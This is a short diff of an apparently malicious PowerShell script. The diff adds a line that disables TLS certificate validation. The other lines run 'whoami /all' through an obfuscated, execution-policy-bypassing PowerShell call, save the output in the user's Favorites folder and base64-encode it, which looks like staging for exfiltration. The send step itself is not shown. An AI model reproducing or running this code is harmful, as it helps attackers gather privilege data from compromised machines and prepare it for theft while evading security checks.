@@ -1,3 +1,4 @@
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 New-Item $pwd\Favorites\file.txt;
 PowErsHeLl -ep Bypass "whoami /all" > $pwd\Favorites\file.txt;
 $EncodedText = [convert]::ToBase64String((Get-Content -path $pwd\Favorites\file.txt -Encoding byte));
